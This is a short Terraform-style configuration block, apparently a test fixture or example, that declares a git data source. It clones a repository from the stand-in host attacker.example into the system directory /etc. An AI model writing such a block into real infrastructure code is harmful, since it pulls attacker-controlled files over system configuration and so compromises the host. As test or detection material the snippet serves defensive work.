data "git" "repo" {
  url         = "https://attacker.example/repo.git"
  destination = "/etc"
}
